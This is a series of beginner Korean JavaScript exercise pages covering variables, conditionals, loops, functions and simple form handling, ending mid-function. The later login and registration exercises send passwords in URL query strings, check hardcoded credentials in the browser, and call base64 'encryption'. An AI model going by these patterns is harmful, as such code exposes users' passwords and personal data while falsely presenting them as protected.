<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 1일차(기본문법처리)</title>
    <!--파빌리온 적용-->
    <link rel="shortcut" href="#" >
</head>
<script>
    /*
    자바스크립트 코드(문법)가 들어갈 자리 
    console.log : 결과 값을 출력하는 문법
    */ 
    console.log("홍길동님 환영합니다");

    var a = "이순신" ; //a변수에 '이순신'이라는 단어를 입력시킴
    console.log(a);

    var b = 1000; //b 변수에 1000 이라는 숫자를 입력시킴
    console.log(b);

    // 문자와 문자를 더해서 사용 가능
    var aa = "2000";
    var bb = "3000";
    var cc = aa + bb;
    console.log(cc);

    // 숫자 입력시에는 "" 또는 ''를 사용하면 계산 불가
    var aa = 2000;
    var bb = 3000;
    var cc = aa + bb;
    console.log(cc);

    var user = "강감찬";
    var msg = "님 환영합니다";
    var print = user + msg;
    console.log(print);
    
    

</script>
<body>
    
</body>
</html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascrpt 2일차(기본문법처리)</title>
    <!-- 파빌리온 적용 -->
    <link rel="shortcut icon" href="#">
</head>
<script>
    //변수(variables) 선언 : 계속적으로 변하는 값 (참고.상수)
    var a;
    var b=1;
    var c="데이터";
    var d=c;
    console.log(b);
    b=10;
    console.log(b);
    var aa,bb,cc,dd; //변수선언방식이며, 변수의 값이 없는 변수명만 선언. 변수선언을 아끼지말고
    bb="홍길동"; //해당 변수에 "홍길동"이란 문자값을 적용
    // +,-,*,/,%(나머지값을 구함) - 연산기호. 연산자
    console.log();
    /* 응용문제 3개의 변수값에 56,32,8이란 숫자가 입력. 해당 변수를 연산해서 결과를 출력
        56과 32를 더하고, 8을 곱해서 최종 결과값 출력
    */
    var f =56;
    var x =32;
    var z =8;
    var r = (f+x)*z;
    console.log(r);

    // 문자와 문자가 결합되는 형식
    // 고객이 로그인 할 때 이름과 등급이 표시되는 형태
    f="이순신";
    x="실버";
    z= f + "님 환영합니다. 회원님의 등급은 : " + x + "입니다";
    console.log(z);
    
    // 나머지 값
    var k=51%2; //50/2의 나머지값. 51/2의 나머지값 0,1로 출력됨. 0일 경우는 짝수, 1일 경우는 홀수
    console.log(k)
</script>
<body>
    
</body>
</html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascrpt 2일차(조건문 if문)</title>
    <link rel="shortcut icon" href="#">
</head>
<script>
    var a = 20;
    var b = 20;
    //if문은 무조건 if 로 시작해야 함
    //else if는 여러번 사용가능
    //else 는 if와 else if를 뺀 나머지 값을 비교할 때 사용
    
    if(a<b) {
        console.log("a값이 작습니다");
        }
    else if (a>b) {
        console.log("b값이 작습니다");
        }
    else if (a==b) {
        console.log("두값이 모두같습니다");
        }
    else { console.log("두값이 같습니다");
        }
    //  응용문제2. 수식연산으로 결과값을 비교하여 어느 값이 큰 값인지 출력하는 문법 제작
        // 1.70*80+16
        // 2.80*40*7
    
    var k1=70*80+16 ;
    var k2=80*40*7 ;
    var k3="두값이 같습니다";

    if(k1>k2)
        {//console.log("k1");
            k3="k1이 큽니다";
        }
    else if(k1<k2)
        {//console.log("k2");
            k3="k2가 큽니다";
        }
    else
        {//console.log("i don know");
            k3=k3;
        }
    console.log(k3);

// 조건문 안의 조건문

var mid="hong";
var mpass="1234";

if(mid=="hong"){        //첫번째 조건문
    if(mpass=="1234"){
        console.log("로그인하였습니다");
    }
    else{
        console.log("비밀번호를 입력하세요");
    }
}
else{
    if(mid==""){

    }
    //비밀번호 오류 횟수 초과의 경우도 사용할 수 있음
    console.log("해당아이디는 가입되지 않은 고객입니다");
}
//응용문제3. 회원이 로그인 할 때, 이메일과 패스워드를 검토하는 프로세서 제작
//회원: hong@nate.com  /  a123456 일 경우는 '로그인되었습니다'
// 그 외에는 '아이디 및 패스워드를 확인하세요'라고 출력되도록 하세요

var id_nm= "hong@nate.com"
var pw_nm= "a123456"
var output= "아이디 및 패스워드를 확인하세요"

    if(id_nm=="hong@nate.com"){
            if(pw_nm=="a123456"){
                console.log("로그인되었습니다");
            }
            else{console.log(output)};
        }
    else {console.log(output)}

    //비교연산자 사용할 경우 : &&는 두개의 값이 모두 일치하는 경우이고   ||는 두개의 값 중에서 한가지라도 일치하는 경우
    if(id_nm=="hong@nate.com"&&pw_nm=="a123456"){
        console.log("로그인되었습니다");
        }
    else {
        console.log(output);
    }


</script>
<body>
    
</body>
</html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>avascript 2일차-반복문</title>
    <link rel="shortcut icon" href="#">
    <!-- 
        [순차반복문]
        for문   while문     do~while문  (속도 저for 중while 고do while)

        [배열]
        for in문   forEach문    Map문   Each문
    -->
</head>
<script>
    //반목문은 무조건 숫자로 이루어져야 작동이 됨
    var f;
    for(f=1;f<10;f++){      //(시작값;종료값;증가++ 또는 감소--)
        console.log(f);
    }
    for(f=5;f<=20;f++){     // = 은 반드시 뒤쪽에 붙여야 함
        console.log(f);
    }
    for(f=10;f>=0;f--){      // 역순으로도 가능함
        console.log(f);
    }
// 응용문제4.숫자 22부터 30까지 출력되는 반복문을 제작
    var  z1;
    for(z1=22;z1<=30;z1++){
        console.log(z1);
    }
// 응용문제5. 50부터 32까지 출력되는 반복문을 제작
    var z2;
    for(z2=50;z2>=32;z2--){
        console.log(z2);
    }

//정수:양의 정수, 음의 정수, 0
// 유리수:0.1   0.2 ...   무리수:log2 2n
// 실수:-1  0   12  1234e
// 실수 >   유리수  >   정수    >   양의정수,   음의정수
//      >   무리수
</script>
<body>
    
</body>
</html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>avascript 2일차-for문+if문</title>
    <!-- 파빌리온 적용 -->
    <link rel="shortcut icon" href="#">
</head>
<script>
    var a;
    for(a=1;a<=10;a++){     //1~10까지 반복을 진행
        if(a==5 ||a==7){    //반복을 진행할 때 지속적으로 조건을 확인
            console.log(a);
        }
    }
    for(a=1;a<=10;a++){
       if(a==5){
            console.log(a);
        }
        else if(a==7){
            console.log(a);
        }
    }
    // 응용문제6.1~30까지의 숫자 중 홀수값만 모두 출력하는 코드를 작성
    var k3;
    for(k3=1;k3<=30;k3++){
        if(k3%2==1){
            console.log(k3);
        }
        else{
            ""
        }
    }
    for(k3=1;k3<=30;k3++){
        if(k3%2==1){
            console.log(k3+"홀수");
        }
        else{
            console.log(k3+"짝수");
    }
    }
    
    // 응용문제7. 다음의 결과값을 확인 후, 그 결과값을 출력할 수 있는 코드를 제작
    // 24 32 40 48 56
    var k4;
    for(k4=3;k4<=7;k4++){
        console.log(k4*8)        ;
    }
    var k5;
    
    for(k5=3;k5<=7;k5++){
        var result=k5*8;  //이게 문법 안에 들어와야 함
        console.log(result);
    }

    var x;
    var j=8;
    var t;
    for(x=1;x<=9;x++){
        t=x*j;
        if(t>=24 && t<=56){
            console.log(t);
        }
    }

</script>
<body>
    
</body>
</html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 2일차-반복문(while문)</title>
    <!-- 파빌리온 적용 -->
    <link rel="shortcut icon" href="#">    
</head>
<script>
    var a=1; //시작값. 변수에 같이 선언
    while(a<=10){ //종료값
        console.log(a); //결과값
        a++;  //이게 위로 가면 결과값이 달라짐. 첫 출력이 2부터 되어버림(증감)
    }

    // 응용문제8. 다음과 같이 결과가 나오게 while문을 사용
    // 15 14 13 12 .....7
    var n=15;
    while(n>=7){
        console.log(n);
        n--;
    }




</script>
<body>
    
</body>
</html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 2일차-do while</title>
    <!-- 파빌리온 미적용 -->
    <link rel ="shortcut icon" href="#">
</head>
<script>
    var a=1; //시작값
    do{
        //console.log(a); //출력값
        a++; //증감
    }while(a<=10);  //종료값

    //응용문제9.다음 결과 값에 맞춰 do-while문으로 코드를 제작
    // 3 6 9 12 15 18 21 24 27
    var a1=1;
    do{
        var a2=a1*3;
        console.log(a2);
        a1++;
    }while(a1<10);

    


</script>
<body>
    
</body>
</html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>java script 2일차-더블반복문-for+if</title>
    <link rel="shortcut icon" href="#">
    <!--파빌리온 미적용-->
</head>
<script>
    var a;
    var b;
    var c;
    for(a=2;a<=9;a++){
        for(b=1;b<=9;b++){
            c=a*b;
            // console.log(a+"*"+b+"="+c);
        }
    }
    // 응용문제10.다음의 결과값이 나오도록 더블반복문을 이용해 작성
    // 2 3 4 5 6 7 8 9 10 
    // 3 4 5 6 7 8 9 10 11
    // 4 5 6 7 8 9 10 11 12
    var a1;
    var b1;
    var c1;
    for(a1=0;a1<=2;a1++){
        for(b1=2;b1<=10;b1++){
            c1=a1+b1;
            // console.log(c1);            
        }
    }

    var a2;
    var b2;
    var c2;
    for(a2=1;a2<=3;a2++){
        for(b2=1;b2<=9;b2++){
            c2=a2+b2;
            // console.log(c2);
        }
    }

    // 2 4 6 8 10
    // 6 12 
    // 4 8 12 16 20
    var a3;
    var b3;
    var c3;
    for(a3=2;a3<=4;a3++){   //2~4
        for(b3=1;b3<=5;b3++){     //1~5
            c3=a3*b3;
            if(c3%2==0){    //수식계산의 결과값이 짝수일때
                // console.log(c3);   // 해당결과값을 출력
            }
            
        }
    }
// 응용문제 11. 구구단 중에서 3단 5단 7단 9단만 출력하는 더블반복문을 작성
    var a4;
    var b4;
    var c4;
    for (a4=2;a4<=9;a4++){
        if(a4%2==1){
           for(b4=1;b4<=9;b4++){
               c4=a4*b4;
               console.log(a4+"*"+b4+"="+c4);
           }
        }
        else{""}
    }



</script>
<body>
    
</body>
</html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>java script 2일차-더블반복문-while+if</title>
    <link rel="shortcut icon" href="#">
    <!--파빌리온 미적용-->
</head>
<script>
    var a=1;
    var c;
    while(a<=3){
        var b=1;        //while 문(do-while도 포함) 작성할 때, 초기값은 큰 반복문 안에 있어야 지속적으로 초기화되면서 적용될 수 있음
        while(b<=3){
            c= a + b;
            // console.log(c);
            b++;
        }
        a++
    }

// 응용문제 12.구구단 5단부터 2단까지 역순으로 출력되는 코드 작성
// 단, 결과는 아래처럼 나오도록 함 (더블while)
//  5*9=45
//  5*8=40
//  ...
//  2*2=4
//  2*1=2
    var x =5;
    var z;
    while(x>=2){
        var y =9;
        while(y>=1){
            z=x*y;
            // console.log(x+"*"+y+"="+z);
            y--;
        }
        x--;
    }
// 응용문제 13. 구구단 2단~9단 중 결과값이 짝수인 구구단만 출력
// while문으로 작성
    var d1=2;
    var d3;
    while(d1<=9){
        var d2=1
        while(d2<=9){
            d3=d1*d2;
            if(d3%2==0){
            //console.log(d1+"*"+d2+"="+d3);
            }
            d2++;
        }
        d1++
    }

    var b1=2; //큰 반복문 초기화
    var b3;   //결과값
    while(b1<=9){  //종료값
        var b2=1;  //작은 반복문 초기화
        while(b2<=9){  //종료값
            b3=b1*b2;  //수식계산파트
            if(b3%2==0){  //수식계산에서 결과값에 대한 짝수인 조건
                console.log(b1+"*"+b2+"="+b3);
            }
            b2++;
        }
        b1++;
    }
</script>
<body></body>
</html>
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>java script 2일차-더블반복문-do-while+if</title>
    <link rel="shortcut icon" href="#">
    <!--파빌리온 미적용-->
</head>
<script>
//응용문제.14 구구단 8단~7단까지의 결과를 출력. 단, 결과는 아래처럼 나오도록
// do-while로 작성할 것
// 8*1=8
// 8*2=16 ...
// 7*1=7
// 7*2=14 ... 7*9=63

var a=8;
var c;
do{
    var b=1 ;
    do{
        c=a*b;
   //     console.log(a+"*"+b+"="+c);
        b++;
    }while(b<=9);
    a--;
}while(a>=7);

//응용문제.15 do while문으로 작성. 홀수값 결과만 출력할 것
//구구단. 4단~7단까지 결과 값 중 홀수 값만 출력할것

var x = 4;
var z  ;
do{
    var y = 1
    do{
        z = x * y;
        if(z%2==1){
            console.log(x+"*"+y+"="+z)
        }
        y++;
    }while(y<=9);

    x++;
}while(x<=7);


</script>
<body>

</body>
</html>
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>java script 2일차-반복문 응용</title>
    <link rel="shortcut icon" href="#">
    <!--파빌리온 미적용-->
</head>
<script>
    //for+while  구구단 2~4단까지 출력
    var sum;
    var a;
    for(a=2;a<=4;a++){
        var b=1;
        while(b<=9){ 
            sum=a*b;
            // console.log(a+"*"+b+"="+sum);
            b++;
        }
    }
    //quiz 1. 구구단 2단~9단까지 결과값 중 30 이상인 결과 값만 출력되도록 코드 작성. 단, while과 do-while를 사용
    
    var rslt ;
    var a = 2;
    do{
        var b = 1;
        while(b<=9){
                rslt=a*b;
                if(rslt>=30){
                    console.log(a+"*"+b+"="+rslt);
                }
                b++;
            }
        a++;
    }while(a<=9);
    
                             
        
    //quiz 2. 아래의 결과값을 확인, 해당 결과값이 나오도록 코드 작성
    //ex. 6 8 10 12     9 12 15 18      12 16 20 24     15 20 25 30 단, 문법은 do-while과 for문을 이용

    var rslt1;
    var a1;
    for(a1=2;a1<=5;a1++){
        var b1=3;
        do{
            rslt1 = a1*b1;
            console.log(a1+"*"+b1+"="+rslt1);
            b1++;
        }while(b1<=6)
    }

</script>
<body></body>
</html>
      <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 3일차(선택문-switch)</title>
    <!--파빌리온 적용-->
    <link rel="shortcut icon" href="#">
</head>
<script>
    var a=4;               //사용자가 선택한 값
    switch(a){             //선택한 값(var)을 대입.switch는 if문보다 속도가 느리다
        case 0:            //switch에서 대입한 값과 case에서 설정된 값을 비교
            console.log("무통장입금");
        break;              //switch와 case가 동일한 경우, break 작동하여 프로세스 종료

        case 1: case 5:
            console.log("신용카드결재");
        break;
        
        case 2:
            console.log("가상계좌결재");
        break;
        
        case 3:
            console.log("휴대폰결재");
        break;

        default:
            console.log("계좌이체");
        break;
    }
    //응용문제 1. 사용자 이름에 따라 등급을 출력해야 함
    // 홍길동 : 실버등급, 이순신 : 골드등급, 유관순 : 실버등급, 강감찬 : 일반회원, 안중근 : 휴면등급

    var a1 ="안중";
    switch(a1){
        case "홍길동": case "유관순":
            console.log("실버등급");
        break;
        case "이순신":
            console.log("골드등급");
        break;        
        case "강감찬":
            console.log("일반회원");
        break;        
        case "안중근":
            console.log("휴면등급");
        break;        
        default: 
            console.log("회원이 아닙니다");
        break;
    }
</script>
<body>
    
</body>
</html>
      <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 3일차(함수-function)</title>  <!--back-end는 method란 용어를 사용함-->
    <!--파빌리온 적용-->
    <link rel="shortcut icon" href="#">
</head>
<script>
    function abc(){     //abc라는 이름을 가진 함수. 함수명을 호출해야지만 작동
        console.log("test");
    }
    abc();              //abc함수명 호출(즉시 실행함수)
    
    function bbb(){     //html에서 호출된 함수가 작동되는 사항
        console.log("버튼클릭 이벤트 핸들링함수 실행");
    }

    function ccc(){
        ddd(); //확장함수 호출
        eee(); //확장함수 호출
    }
    function ddd(){
        console.log("이벤트 핸들링 함수에서 확장함수로 전달");
    }
    function eee(){
        console.log("두번째 확장함수")//두가지 이상 한꺼번에 체크할때, 멀티 호출
    }
</script>
<body>
    <!-- html에서 onclick 속성과 함께 함수명을 호출 -->
    <input type="button" value="click" onclick="bbb()"><br><br>
    <input type="button" value="click2" onclick="ccc()"><br><br>
</body>
</html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 3일차(함수-function인수값사용+전역변수,지역변수)</title>  <!--back-end는 method란 용어를 사용함-->
    <!--파빌리온 적용-->
    <link rel="shortcut icon" href="#">
</head>
<script>
    //값 전달시 인수의 갯수와 동일하게 보낼 필요는 없으며,
    //많은 양의 텍스트를 전달하는 경우, 데이터 분실이 발생될 수 있음

    function aaa(a1,a2){    //aaa함수에 인수값 2개를 받음
        console.log(a1,"|",a2);
        // console.log(a2);
    }
    var data1 = "홍길동";
    var data2 = "hong@nate.com";
    aaa(data1,data2);       //aaa함수를 호출과 동시에 2개의 데이터를 전송


    //지역변수, 전역변수
    var order = 100;            //모든 함수에서 사용가능한 전역변수
    
    function ccc(){
        var order2 = 200;       //ccc함수에서만 사용하는 지역변수임
        var order = "홍길동";   //전역변수 order와 다르게 작동.지역변수임
        order="홍길동";         //var를 생략하는 경우 전역변수 order를 갖고 와서 새로운 value입력
        console.log(order);
        console.log(order2);
    }
    function ddd(){
        console.log(order);
        console.log(order2);    //error 발생. order2는 지역변수이므로 이 function에서 미작동
    }
    ccc();
    ddd();

</script>
<body>

</body>
</html>
      <!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 3일차(html UI와 연결)</title>  <!--back-end는 method란 용어를 사용함-->
    <!--파빌리온 적용-->
    <link rel="shortcut icon" href="#">
</head>
<script>
    alert("메시지 출력");       //경고메시지 출력(팝업창 형태의)
    function abc(){
        //document : 현재 페이지
        //getElementById : 해당 페이지에 id 이름을 가진 오브젝트를 가져옴
        var no = document.getElementById("sno");
        //value : 사용자가 입력 또는 선택한 값
        if(no.value==""){
            alert("인증번호를 입력하세요");
        }
        else{
        //location.href : 페이지를 이동할때 사용
            location.href="http://nate.com";
        }
    }

    /* 응용문제2. 사용자id 및 password를 입력해야  nate.com으로 이동하도록 작성
        단, input type은 button으로 활용*/

    function login(){
        // 자료형 : string(문자), number(숫자), boolean(true false), undefined, null 
        var user_id = document.getElementById("user_id");
        var user_pw = document.getElementById("user_pw");
        if(user_id.value==""){
            alert("id를 입력하셔요");
        }
        else if(user_pw.value==""){
            alert("비밀번호를 입력하셔요");
        }
        else{
            location.href="http://nate.com";
        }

        // 자료형 예시. 숫자를 문자로 변환. 문자를 숫자로 변환.
        var a = 100 ;
        var b = 200 ;
        var c = String(a) +String(b) ;
        console.log(c);
    }        
    function chk_tel1(){        //사용자가 3개의 입력값을 하나의 변수로 받아서 처리
        var tel1 = document.getElementById("tel1");
        var tel2 = document.getElementById("tel2");
        var tel3 = document.getElementById("tel3");
        var tel_no = tel1.value + tel2.value + tel3.value ;
        console.log(tel_no);
    }
    function chk_tel2(){        //한가지 입력값을 변수로 받아서 처리
        var tel_all = document.getElementById("tel_all");
        console.log(tel_all);
    }
    


</script>
<body>
    인증번호 입력 : <input type="text" id="sno" value="">
    <input type="button" value="전송" onclick="abc()"><br><br>

<!-- 모든 html 입력부분은 "문자"로 인식함 -->
    사용자 id : <input type="text" id="user_id" value=""><br>
    비밀번호 : <input type="text" id="user_pw" value=""><br>
    <input type="button" id="user_pw" value="확인" onclick="login()"><br><br><br>

    <!-- back-end : 숫자만 전송 요청("-" 제외) -->
    <p>휴대폰 번호 : 
        <input type="text" id="tel1"> - 
        <input type="text" id="tel2"> - 
        <input type="text" id="tel3">
        <input type="button" value="전송" onclick="chk_tel1()">
    </p>
    <p>휴대폰 번호 : <input type="text" id="tel_all">
        <input type="button" value="전송" onclick="chk_tel2()">
    </p>    


</body>
</html>
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 3일차(html UI와 연결2)</title>  <!--back-end는 method란 용어를 사용함-->
    <!--파빌리온 적용-->
    <link rel="shortcut icon" href="#">
</head>
<script>
    function calcs(){
        var no1 = document.getElementById("no1");
        var no2 = document.getElementById("no2");
        var no3 = Number(no1.value) + Number(no2.value);
        alert("총 합계 값 : " + no3 + "   입니다");
    }

</script>
<body>
    첫번째 값 : <input type="text" id="no1"><br>
    두번째 값 : <input type="text" id="no2"><br>
    <input type="button" value="더하기" onclick="calcs()">
</body>
</html>
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 3일차(html UI와 연결 응용편)</title>  <!--back-end는 method란 용어를 사용함-->
    <!--파빌리온 적용-->
    <link rel="shortcut icon" href="#">
</head>
<script>
    function gugudan(){
        var dan = document.getElementById("dan");
        var a19 ;
        var rslt  ;
        
        // console.log(Number(dan.value)); //숫자 또는 NaN(not a number);
        if(isNaN(Number(dan.value))==true){   //isNaN는 숫자, 문자를 확인하는 문법.구문
            alert("숫자만 사용됩니다");
        }
        else{       //isNaN 이 false일 때 반복문을 적용
            if(dan.value==""){
                alert("뭐든 입력하셔요");        
            }
            else{
                for(a19=1;a19<=9;a19++){
                rslt = Number(dan.value) * a19 ;
                console.log(dan.value + "*" + a19 + "=" + rslt)  ;
                }    
            }
        }
    }
</script>
<body>
    <!-- 숫자를 입력하면 해당 숫자의 구구단을 출력시키기 -->
    구구단을 외자 :
    <input type="text" id="dan">
    <input type="button" value="출력" onclick="gugudan()">

</body>
</html>
      <!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 3일차(입력값에 대한 자리수 확인)</title>  <!--back-end는 method란 용어를 사용함-->
    <!--파빌리온 적용-->
    <link rel="shortcut icon" href="#">
</head>
<script>
    function no_check(){
        var no = document.getElementById("no");
        if(no.value==""){
            alert("인증번호를 입력하세요");
        }
        else{
            if(no.value.length < 6){        //length는 문자의 갯수.길이를 말함. length에는 number를 사용하면 안됨 Number(no.value.length) 이렇게 하면 에러남
                alert("인증번호는 6자리입니다");
            }
            else{
                if(isNaN(Number(no.value))==true){
                    alert("숫자만 입력하세요");
                }
                else{
                    location.href="http://nate.com";
                }
            }
        }
    }

    var a="123d45";
    console.log(a.length); //length는 문자열에만 인식함
</script>
<body>
    인증번호 6자리 : <input type="text" maxlength="6" id="no">
                    <input type="button" value="인증확인" onclick="no_check()">
</body>
</html>
      <!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 3일차(초기값 정보입력 및 발송)</title>  <!--back-end는 function을 method란 용어로 사용함-->
    <!--파빌리온 적용-->
    <link rel="shortcut icon" href="#">
</head>
<script>
    function bbb(){
        var no1 = document.getElementById("no1");
        var no2 = document.getElementById("no2");

        location.href="http://hyuk313.dothome.co.kr/js/js_index20.html?nos1="+no1.value+"&nos2="+no2.value;
        
    }
</script>
<body>
    <input type="text" id="no1">
    <input type="text" id="no2">
    <input type="button" value="전송" onclick="bbb()">
</body>
</html>
      <!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 3일차(응답데이터 처리)</title>  <!--back-end는 method란 용어를 사용함-->
    <!--파빌리온 적용-->
    <link rel="shortcut icon" href="#">
</head>
<script>
    // nos1, nos2 값으로 데이터를 입력파트에서 받는다
    var data = window.location.search;      //URL을 뺀 나머지 URI 값을 가져옴(search)
                                            //[ ]는 배열 기호     
    var nos2 = data.split("&nos2=");        //split"찾을문자열" : 해당문자열을 찾아서 배열화(제일 뒤의 숫자부터 잘라내야 함)
    var ndata2 = nos2[1];

    var nos1 = nos2[0].split("?nos1=");     //split 사용시 모든 배열은 '문자'로 인식. 연산 및 계산시에는 Number로 변환해야 함
    var ndata1 = nos1[1];
    
    var sum = Number(ndata1) + Number(ndata2); 

    console.log(data);
    console.log(nos2);
    console.log(nos2[1]);
    console.log(nos2[0]);
    console.log(nos1[1]);
    console.log(sum);

</script>
<body></body>
</html>
      <!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 3일차(location 통신응용편)</title>  <!--back-end는 function을 method란 용어로 사용함-->
    <!--파빌리온 적용-->
    <link rel="shortcut icon" href="#">
</head>
<script>
// 아이디 는 biz_id
// 패스워드 는 biz_pw
// 사업자번호 는 biz_no

var data = window.location.search;  //biz_id + biz_pw + biz_no
var split_1 = data.split("&biz_no=");   //사업자번호(biz_no)
var biz_no = split_1[1];
var split_2 = split_1[0].split("&biz_pw=");   //패스워드(biz_pw)
var biz_pw = split_2[1];
var split_3 = split_2[0].split("?biz_id=");   //패스워드(biz_pw)
var biz_id = split_3[1];

function check_data(){
    if(data==""){
        alert("정보를 입력하셔요");
    }    
    else{
        if(biz_no=="2341256789"){
            alert("해당 가입자는 이미 가입되셨습니다");
        }
        else{
            if(biz_no.length<10){
                alert("사업자번호는 모두 10자리입니다");
            }
            else{
                if(isNaN(Number(biz_no)==true)){
                    alert("사업자번호에 숫자만 입력하셔요");
                }
                else{
                    alert("정상 가입되었습니다");
                }
                
            }
        }

        }
    }

console.log("원본데이타"+data);
console.log("사업자id"+biz_id);
console.log("비밀번호"+biz_pw);
console.log("사업자등록번호"+biz_no);

</script>
<body>
   입력된 결과를 확인해보실까요? 
    <input type="button"     value="두둥"   onclick="check_data()">
</body>
</html>
   <!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>javascript 3일차(location 통신응용편)</title>  <!--back-end는 function을 method란 용어로 사용함-->
    <!--파빌리온 적용-->
    <link rel="shortcut icon" href="#">
</head>
<script>
// 아이디 는 biz_id
// 패스워드 는 biz_pw
// 사업자번호 는 biz_no

var data = window.location.search;  //biz_id + biz_pw + biz_no
//console.log(data);

var split_1 = data.split("&biz_no=");   //사업자번호(biz_no)
var biz_no = split_1[1];
// console.log(atob(biz_no)); //atob:btoa에서 인코딩된 값을 base64로 디코딩하는 명령어
// console.log(atob(split_1[1]));

var split_2 = split_1[0].split("&biz_pw=");   //패스워드(biz_pw)
var biz_pw = split_2[1];
//  console.log(atob(biz_pw));
var split_3 = split_2[0].split("?biz_id=");   //패스워드(biz_pw)
var biz_id = split_3[1];

function check_data(){
    if(data==""){
        alert("정보를 입력하셔요");
    }    
    else{
        if(biz_no=="2341256789"){
            alert("해당 가입자는 이미 가입되셨습니다");
        }
        else{
            if(biz_no.length<10){
                alert("사업자번호는 모두 10자리입니다");
            }
            else{
                if(isNaN(Number(biz_no)==true)){
                    alert("사업자번호에 숫자만 입력하셔요");
                }
                else{
                    alert("정상 가입되었습니다");
                }
                
            }
        }

        }
    }

console.log("원본데이타 "+data);
console.log("사업자id   "+biz_id);
console.log("비밀번호   "+biz_pw);
console.log("사업자등록번호 "+biz_no);
console.log("사업자번호암호해독 "+atob(biz_no));


</script>
<body>
   입력된 결과를 확인해보실까요? 
    <input type="button"     value="두둥"   onclick="check_data()">
</body>
</html>
   <!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Javascript 3일차 - Javascript location통신 응용편</title>
    <!-- 파빌리온 적용 -->
    <link rel="shortcut icon" href="#">
</head>
<script>
    function register(){
        var mid = document.getElementById("mid").value;
        var mpass = document.getElementById("mpass").value;
        var mno = document.getElementById("no1").value + 
                  document.getElementById("no2").value +
                  document.getElementById("no3").value;
        
        /* console.log(mid);
        console.log(mpass);
        console.log(mno); */
        
        if(mid.length < 5){
            alert("아이디는 최소 5자 이상 입력되어야 합니다.")
        }
        else{
            if(mpass.length < 4){
            alert("패스워드는 최소 4자 이상 입니다.")
            }
            else{
                if(mno.length < 10){
                    alert("사업자번호는 총 10자리 숫자 입니다.")
                }
                else{
                    if(isNaN(Number(mno))){
                        alert("사업자번호는 숫자만 입력해야 합니다.")
                    }
                    else{
                        //암호화 :btoa=문자, 숫자를 base64암호모듈로 적용
                        var secu1 = btoa(mno);
                        var secu2 = btoa(mpass);                        
